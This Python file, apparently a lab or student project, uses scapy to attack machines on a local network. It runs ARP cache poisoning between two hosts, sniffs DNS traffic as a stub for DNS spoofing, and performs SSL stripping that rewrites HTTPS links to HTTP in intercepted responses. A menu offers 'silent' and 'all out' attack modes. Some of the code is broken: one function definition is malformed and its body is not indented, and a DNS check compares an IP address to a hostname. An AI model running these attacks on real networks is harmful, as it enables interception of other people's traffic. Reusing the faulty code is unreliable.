from scapy.all import *
import time

ipM1 = "192.168.56.101" #  Rename to IPAttacker? 
ipM2 = "192.168.56.102"
ipM3 = "192.168.56.103" # IPVictim?
ipMal = "50.63.7.226"   # Malware IP
trapUrl = 'google.com'

def ARP_spoofing():
    macM1 = "08:00:27:b7:c4:af"
    macM2 = "08:00:27:CC:28:6f"
    macM3 = "08:00:27:d0:25:4b"

    arp_M1 = Ether() / ARP()
    arp_M1[Ether].src = macM3
    arp_M1[ARP].hwsrc = macM3
    arp_M1[ARP].psrc = ipM2
    arp_M1[ARP].hwdst = macM1
    arp_M1[ARP].pdst = ipM1

    arp_M2 = Ether() / ARP()
    arp_M2[Ether].src = macM3
    arp_M2[ARP].hwsrc = macM3
    arp_M2[ARP].psrc = ipM1
    arp_M2[ARP].hwdst = macM2
    arp_M2[ARP].pdst = ipM2
    sendp(arp_M1, iface = "enp0s3")
    sendp(arp_M2, iface = "enp0s3")

# DNS-Spoof Attack
def dns_spoof_attack():
    packets = sniff(filter='udp port 53', count=10, prn=process_packet)
    # for packet in packets:
    #     if packet.haslayer(DNS):
    #         dns_packet = packet[DNS]
    #         print("DNS Query: ", dns_packet.qd.qname)
    #         # print("DNS Response: ", dns_packet.an.rdata)
            
    # dns_p1 = IP(src=ipMal, dst=ipM3) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=trapUrl))
    # dns_p1.show()

def process_packet:
if IP in packet and UDP in packet and DNS in packet:
    ip_packet = packet[IP]
    udp_packet = packet[UDP]
    dns_packet = packet[DNS]

    destination_ip = ip_packet.dst
    destination_port = udp_packet.dport

    if destination_ip == trapUrl:
        print("DNS packet with destination IP " + trapUrl + " found!")
        print("Source IP: ", ip_packet.src)
        print("Source Port: ", udp_packet.sport)

        # Display complete DNS packet information
        dns_packet.show()


# SSL strip one packet
def ssl_strip(packet):
    if packet[TCP].payload:
        payload = bytes(packet[TCP].payload)

        # Only work with packets that are HTTP responses
        if b"HTTP" in payload and b"200 OK" in payload:
            # Strip the secure channels from the packet
            modified_payload = payload.replace(b"HTTPS://", b"HTTP://")
            packet.payload = bytes(modified_payload)

            # By deleting the checksums, scapy will automatically recalculate them
            del packet[IP].chksum
            del packet[TCP].chksum

            send(packet, verbose=0)

def ssl_strip_attack():
    # prn = function to apply to each sniffed packet
    sniff(filter="tcp and port 80", prn=ssl_strip)
	

# =============== Text Interface ===============

def silent_mode():
    try:
        # while True:
        #     ARP
        dns_spoof_attack()
    except KeyboardInterrupt:
        pass

def all_out_mode():
    try:
        while True:
            ARP_spoofing()
            time.sleep(20)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    mode = str(input(   "Plase select the attack mode:\n" +
                    "type \"1\" for silent mode;\n" +
                    "type \"2\" for all out mode\n"))
    if mode == "1":
        silent_mode()
    elif mode == "2":
        all_out_mode()
    else:
        print("Input error!")
        
